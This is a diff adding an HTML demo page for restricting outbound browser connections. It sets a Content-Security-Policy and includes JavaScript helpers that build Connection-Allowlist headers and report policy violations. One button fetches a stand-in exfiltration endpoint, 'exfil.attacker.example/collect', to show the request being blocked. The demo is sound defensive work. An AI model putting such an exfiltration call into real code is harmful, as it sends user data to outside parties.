@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <title>Restrict Outbound Connections Demo</title>
+  <!--
+    Server HTTP response headers configured alongside the paired CSP fallback below:
+      Vary: Sec-Fetch-Dest
+      Reporting-Endpoints: conn-reports="https://app.example.com/api/security-reports"
+      Connection-Allowlist: (response-origin "https://api.example.com" "https://realtime.example.com" "https://*.cdn.example.com/*"); report-to=conn-reports
+      Content-Security-Policy: default-src 'self'; connect-src 'self' https://api.example.com https://realtime.example.com wss://realtime.example.com; img-src 'self' https://*.cdn.example.com data: blob:; form-action 'self'; worker-src 'self'; object-src 'none'; base-uri 'self'; report-to conn-reports
+
+    When HTTP response headers cannot be set on static HTML hosting, the paired
+    <meta http-equiv="Content-Security-Policy"> below enforces document-level
+    outbound fetch, subresource, form-action, and worker-src restrictions across all browsers.
+  -->
+  <meta
+    http-equiv="Content-Security-Policy"
+    content="default-src 'self'; connect-src 'self' https://api.example.com https://realtime.example.com wss://realtime.example.com; img-src 'self' https://*.cdn.example.com data: blob:; script-src 'self' 'sha256-afJpRHt0Aqz56Pp+lEa7gC8Nvewv0oXbbMzLr84pAZ4='; form-action 'self'; worker-src 'self'; object-src 'none'; base-uri 'self'"
+  />
+</head>
+
+<body>
+  <h1>Restrict Outbound Connections</h1>
+  <p>Test an allowed same-origin request versus an unlisted third-party request blocked by the outbound connection policy.</p>
+
+  <button type="button" id="btn-fetch-allowed">Fetch Allowed Endpoint</button>
+  <button type="button" id="btn-fetch-blocked">Fetch Blocked Third-Party Endpoint</button>
+  <div id="status" role="status" aria-live="polite"></div>
+
+  <script type="module">
+    const statusEl = document.getElementById('status');
+
+    const ALLOWLIST_DESTS = new Set(['document', 'iframe', 'worker', 'sharedworker', 'serviceworker']);
+
+    export function normalizeAllowlistPattern(rawPattern) {
+      const trimmed = String(rawPattern).trim().replace(/^ws(s?):\/\//i, 'http$1://');
+      if (!/^https?:\/\//i.test(trimmed)) {
+        throw new Error(`Pattern must include an http:// or https:// scheme: ${rawPattern}`);
+      }
+      if (/[\s,]/.test(trimmed)) {
+        throw new Error(`Pattern must be a single URLPattern without spaces or commas: ${rawPattern}`);
+      }
+      if (/[()]/.test(trimmed)) {
+        throw new Error(`Custom regex groups are rejected by Connection-Allowlist: ${rawPattern}`);
+      }
+      return trimmed.replace(/^(https?:\/\/[^/?#]+)\/$/i, '$1');
+    }
+
+    export function buildConnectionAllowlistHeader({
+      allowSelf = true,
+      patterns = [],
+      reportTo,
+      redirects = 'block',
+      webrtc = 'block',
+    } = {}) {
+      const items = allowSelf ? ['response-origin'] : [];
+      for (const pattern of patterns) {
+        const raw = String(pattern).trim();
+        if (raw === 'response-origin') {
+          if (!items.includes('response-origin')) items.push('response-origin');
+          continue;
+        }
+        const normalized = normalizeAllowlistPattern(raw);
+        items.push(`"${normalized.replace(/\\/g, '\\\\').replace(/"/g, '\\"')}"`);
+      }
+      let header = `(${items.join(' ')})`;
+      if (redirects === 'allow') header += '; redirects=allow';
+      if (webrtc === 'allow') header += '; webrtc=allow';
+      if (reportTo) {
+        const endpointToken = String(reportTo).trim().replace(/^"+|"+$/g, '');
+        header += `; report-to=${endpointToken}`;
+      }
+      return header;
+    }
+
+    export function setConnectionAllowlistHeaders(res, options = {}) {
+      const {
+        secFetchDest = 'document',
+        patterns = [
+          new URL('https://api.example.com'),
+          'wss://realtime.example.com',
+          'https://*.cdn.example.com/*',
+        ],
+        reportOnlyPatterns,
+        reportEndpointName = 'conn-reports',
+        reportEndpointUrl = 'https://app.example.com/api/security-reports',
+        redirects = 'block',
+        webrtc = 'block',
+        reportOnly = false,
+      } = options;
+
+      const setHeader = (name, value) =>
+        typeof res.setHeader === 'function' ? res.setHeader(name, value) : res.headers.set(name, value);
+
+      if (typeof res.appendHeader === 'function') {
+        res.appendHeader('Vary', 'Sec-Fetch-Dest');
+      } else if (typeof res.headers?.append === 'function') {
+        res.headers.append('Vary', 'Sec-Fetch-Dest');
+      } else {
+        setHeader('Vary', 'Sec-Fetch-Dest');
+      }
+      if (secFetchDest && !ALLOWLIST_DESTS.has(String(secFetchDest).toLowerCase())) return;
+
+      setHeader('Reporting-Endpoints', `${reportEndpointName}="${reportEndpointUrl}"`);
+      setHeader(
+        reportOnly ? 'Connection-Allowlist-Report-Only' : 'Connection-Allowlist',
+        buildConnectionAllowlistHeader({ allowSelf: true, patterns, reportTo: reportEndpointName, redirects, webrtc }),
+      );
+
+      if (!reportOnly && Array.isArray(reportOnlyPatterns)) {
+        setHeader(
+          'Connection-Allowlist-Report-Only',
+          buildConnectionAllowlistHeader({
+            allowSelf: true,
+            patterns: reportOnlyPatterns,
+            reportTo: reportEndpointName,
+            redirects,
+            webrtc,
+          }),
+        );
+      }
+    }
+
+    export async function fetchWithPolicyHandling(url, { statusElement, ...fetchOptions } = {}) {
+      try {
+        const response = await fetch(url, fetchOptions);
+        if (!response.ok) throw new Error(`HTTP ${response.status}`);
+        const body = await response.text();
+        if (statusElement) {
+          statusElement.textContent = `Allowed: Loaded ${url} (${body.length} bytes).`;
+        }
+        return { ok: true, body, error: null };
+      } catch (error) {
+        const message = error instanceof Error ? error.message : String(error);
+        if (statusElement) {
+          statusElement.textContent = `Blocked: Request to ${url} was rejected by the outbound connection policy (${message}).`;
+        }
+        return { ok: false, body: null, error };
+      }
+    }
+
+    // Exercise the header builder at initialization so the normalized policy is verified at runtime.
+    export const activeResponseHeaders = new Headers();
+    setConnectionAllowlistHeaders({ headers: activeResponseHeaders });
+
+    if ('ReportingObserver' in globalThis) {
+      const observer = new ReportingObserver((reports) => {
+        for (const report of reports) {
+          if (report.type === 'connection-allowlist' || report.type === 'csp-violation') {
+            statusEl.dataset.lastReportType = report.type;
+          }
+        }
+      }, { buffered: true });
+      observer.observe();
+    }
+
+    document.getElementById('btn-fetch-allowed').addEventListener('click', () => {
+      fetchWithPolicyHandling('./demo.html', { statusElement: statusEl });
+    });
+
+    document.getElementById('btn-fetch-blocked').addEventListener('click', () => {
+      fetchWithPolicyHandling('https://exfil.attacker.example/collect', { statusElement: statusEl });
+    });
+  </script>
+</body>
+
+</html>
